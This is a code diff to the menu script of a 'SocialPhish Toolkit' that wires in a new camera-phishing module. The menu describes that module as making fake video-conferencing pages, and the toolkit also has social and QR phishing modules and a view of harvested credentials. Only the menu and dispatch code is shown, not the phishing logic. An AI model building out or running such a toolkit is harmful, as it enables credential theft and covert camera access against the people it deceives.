@@ -17,6 +17,7 @@ import pyfiglet
 from rich import box
 from modules.qr_phisher import QRPhisher
 from modules.social_phisher import SocialPhisher
+from modules.camera_phisher import CameraPhisher
 from rich.prompt import Prompt
 from rich.text import Text
 
@@ -156,7 +157,7 @@ def print_banner():
 
 def setup_argparse():
     parser = argparse.ArgumentParser(description='SocialPhish Toolkit - A Social Engineering Framework')
-    parser.add_argument('-m', '--module', help='Specify module to run', choices=['qr', 'social'])
+    parser.add_argument('-m', '--module', help='Specify module to run', choices=['qr', 'social', 'camera'])
     parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
     return parser.parse_args()
 
@@ -187,9 +188,10 @@ def show_menu():
             # Simplified descriptions for narrow terminals
             table.add_row("01", "[bright_green]Social Phishing[/bright_green]", "Social platforms")
             table.add_row("02", "[bright_green]QR Phishing[/bright_green]", "QR codes")
-            table.add_row("03", "[bright_green]Settings[/bright_green]", "Configure")
-            table.add_row("04", "[bright_green]Harvested[/bright_green]", "View data")
-            table.add_row("05", "[bright_red]Exit[/bright_red]", "Exit")
+            table.add_row("03", "[bright_green]Camera Phishing[/bright_green]", "Camera access")
+            table.add_row("04", "[bright_green]Settings[/bright_green]", "Configure")
+            table.add_row("05", "[bright_green]Harvested[/bright_green]", "View data")
+            table.add_row("06", "[bright_red]Exit[/bright_red]", "Exit")
         else:
             # Full descriptions for wider terminals
             table.add_row(
@@ -204,16 +206,21 @@ def show_menu():
             )
             table.add_row(
                 "03", 
+                "[bright_green]Camera Phishing[/bright_green]", 
+                "Create fake video conferencing and streaming pages"
+            )
+            table.add_row(
+                "04", 
                 "[bright_green]Settings[/bright_green]", 
                 "Configure output and notification settings"
             )
             table.add_row(
-                "04", 
+                "05", 
                 "[bright_green]Harvested Details[/bright_green]", 
                 "View all harvested credentials"
             )
             table.add_row(
-                "05", 
+                "06", 
                 "[bright_red]Exit[/bright_red]", 
                 "Exit the toolkit"
             )
@@ -233,9 +240,10 @@ def show_menu():
         console.print("\n[bold]Available Options:[/bold]")
         console.print("1. Social Media Phishing")
         console.print("2. QR Phishing")
-        console.print("3. Settings")
-        console.print("4. Harvested Details")
-        console.print("5. Exit\n")
+        console.print("3. Camera Phishing")
+        console.print("4. Settings")
+        console.print("5. Harvested Details")
+        console.print("6. Exit\n")
 
 def manage_settings():
     """Manage toolkit settings."""
@@ -487,11 +495,14 @@ def main():
             elif args.module == 'social':
                 social_phisher = SocialPhisher()
                 social_phisher.run()
+            elif args.module == 'camera':
+                camera_phisher = CameraPhisher()
+                camera_phisher.run()
         else:
             while True:
                 show_menu()
                 # Accept both formats: 1/01, 2/02, etc.
-                choice = Prompt.ask("Select an option", choices=["1", "01", "2", "02", "3", "03", "4", "04", "5", "05"])
+                choice = Prompt.ask("Select an option", choices=["1", "01", "2", "02", "3", "03", "4", "04", "5", "05", "6", "06"])
                 
                 # Normalize the choice to remove leading zero
                 choice = str(int(choice))
@@ -503,10 +514,13 @@ def main():
                     qr_phisher = QRPhisher()
                     qr_phisher.run()
                 elif choice == "3":
-                    manage_settings()
+                    camera_phisher = CameraPhisher()
+                    camera_phisher.run()
                 elif choice == "4":
-                    show_harvested_details()
+                    manage_settings()
                 elif choice == "5":
+                    show_harvested_details()
+                elif choice == "6":
                     cleanup_processes()
                     console.print("[green]Thank you for using SocialPhish Toolkit![/green]")
                     sys.exit(0)
